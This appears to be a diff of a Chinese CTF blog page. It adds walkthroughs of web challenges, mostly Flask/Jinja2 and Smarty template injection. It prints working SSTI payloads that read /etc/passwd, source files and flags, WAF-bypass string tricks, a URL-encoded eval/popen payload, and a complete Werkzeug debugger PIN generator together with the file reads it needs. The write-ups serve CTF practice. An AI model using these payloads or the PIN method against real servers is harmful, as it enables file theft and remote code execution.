@@ -69,7 +69,47 @@
         <div id="article">
             <div class="toc"></div>
             <div class="article-body">
-                <h5 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h5><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230228151907.png" alt="20230228151907"><br>flask，直接就想到了ssti。但是一直没有找到传参的地方</p>
+                <h5 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h5><p>hint,给了一个提示，失败乃成功之母<br>往decode随便输了一串数字。报错，源码泄露<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240426132538.png" alt="20240426132538"></p>
+<p>第一flask框架,第二有个shell的窗口，第三源码泄露</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240426132620.png" alt="20240426132620"></p>
+<p>第一种方法，直接ssti，直接出,但是我们分析了源码知道，需要base64编码之后再传</p>
+<p>flask，读取文件payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现可以任意文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>读取<code>app.py</code></p>
+<p>获取源码，查看waf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def waf(str):</span><br><span class="line">    black_list = [ flag , os , system , popen , import , eval , chr , request ,</span><br><span class="line">                   subprocess , commands , socket , hex , base64 , * , ? ]</span><br><span class="line">    for x in black_list :</span><br><span class="line">        if x in str.lower() :</span><br><span class="line">            return 1</span><br></pre></td></tr></table></figure>
+
+<p>因为很多东西被过滤的原因，所以使用listdir()函数来读取目录中的文件和子目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接拼接绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240426153310.png" alt="20240426153310"></p>
+<p>读取flag文件，利用倒序读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;txt.galf_eht_si_siht/&#x27;[::-1],&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240426153337.png" alt="20240426153337"></p>
+<p>第二种利用pin码拿到shell</p>
+<p>前面我们就读取了&#x2F;etc&#x2F;passwd</p>
+<p>拿到用户名<code>/home/flaskweb:/bin/sh</code></p>
+<p>再读取<code>/sys/class/net/eth0/address</code><br>拿到<code>e2:3a:22:d6:15:f6</code>需要变为十进制</p>
+<p>再读取<code>/etc/machine-id</code><br>拿到<code>1408f836b0ca514d796cbf8960e45fa1</code></p>
+<p>计算pin值得脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;flaskweb&#x27;,#服务器运行flask所登录的用户名</span><br><span class="line">    &#x27;flask.app&#x27;,#modname</span><br><span class="line">    &#x27;Flask&#x27;,#getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)</span><br><span class="line">    &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;,#flask库下app.py的绝对路径</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;248739320436214&#x27;,#当前网络的mac地址的十进制数</span><br><span class="line">    &#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;#机器的id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+
+<p>生成pin码，执行shell<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240426160204.png" alt="20240426160204"></p>
+<p>先导入os库,再用<code>os.popen(&#39;ls /&#39;).read()</code>读取目录，再读取flag文件,<code>os.popen(&#39;cat /this_is_the_flag.txt&#39;).read()</code></p>
+<h6 id="knowledge-lt-pin码的生成-gt"><a href="#knowledge-lt-pin码的生成-gt" class="headerlink" title="knowledge&lt;pin码的生成&gt;"></a>knowledge&lt;pin码的生成&gt;</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pin码生成要六要素</span><br><span class="line">1.username 在可以任意文件读的条件下读 /etc/passwd进行猜测</span><br><span class="line">2.modname 默认flask.app </span><br><span class="line">3.appname 默认Flask</span><br><span class="line">4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量</span><br><span class="line">5.uuidnode mac地址的十进制,任意文件读 /sys/class/net/eth0/address</span><br><span class="line">6.machine_id 机器码 /etc/machine-id</span><br></pre></td></tr></table></figure>
+
+<h5 id="CISCN-2019华东南-Web11"><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11</h5><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240425152901.png" alt="20240425152901"></p>
+<p>这连个地方一样，猜测利用xff头来注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240425152955.png" alt="20240425152955"></p>
+<p>Smarty，框架，直接<code>&#123;system(&#39;cat /flag&#39;)&#125;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240425155013.png" alt="20240425155013"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240425155021.png" alt="20240425155021"></p>
+<h5 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h5><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230228151907.png" alt="20230228151907"><br>flask，直接就想到了ssti。但是一直没有找到传参的地方</p>
 <p>使用arjun爆破ssti的传参<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230228164832.png" alt="20230228164832"></p>
 <p><code>?name=&#123;&#123;7*7&#125;&#125;</code>试一下<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230228164944.png" alt="20230228164944"></p>
 <p>直接使用常用payload试一下<code>?name=&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;%20&#123;%%20if%20c.__name__%20==%20%27catch_warnings%27%20%&#125;%20&#123;%%20for%20b%20in%20c.__init__.__globals__.values()%20%&#125;%20&#123;%%20if%20b.__class__%20==%20&#123;&#125;.__class__%20%&#125;%20&#123;%%20if%20%27eval%27%20in%20b.keys()%20%&#125;%20&#123;&#123;%20b[%27eval%27](%27__import__("os").popen("cat%20flag.txt").read()%27)%20&#125;&#125;%20&#123;%%20endif%20%&#125;%20&#123;%%20endif%20%&#125;%20&#123;%%20endfor%20%&#125;%20&#123;%%20endif%20%&#125;%20&#123;%%20endfor%20%&#125;</code></p>
@@ -86,6 +126,12 @@
 <h5 id="GDOUCTF-2023"><a href="#GDOUCTF-2023" class="headerlink" title="[GDOUCTF 2023]"></a>[GDOUCTF 2023]<ez_ze></h5><p>这题同样可以使用fenjing一把梭</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240414001928.png" alt="20240414001928"></p>
 <p>自己写的话，先burp抓包fuzz一下，发现<code>_ &#123;&#123;&#125;&#125; . [] &#39;&#39; os popen getitem</code>被过滤了</p>
+<h5 id="HNCTF-2022-WEEK3-ssssti"><a href="#HNCTF-2022-WEEK3-ssssti" class="headerlink" title="[HNCTF 2022 WEEK3]ssssti"></a>[HNCTF 2022 WEEK3]ssssti</h5><p>随便测一下，参数name</p>
+<p>fenjing一把梭</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240417142418.png" alt="20240417142418"></p>
+<p>手注入，可以利用fuzz先查看过滤情况</p>
+<p>再可以利用request参数来传参</p>
+<p><code>&#123;&#123;(lipsum | attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=globals&amp;b=os&amp;c=tac f*</code></p>
 
                 
                 <p class="end">__END__</p>
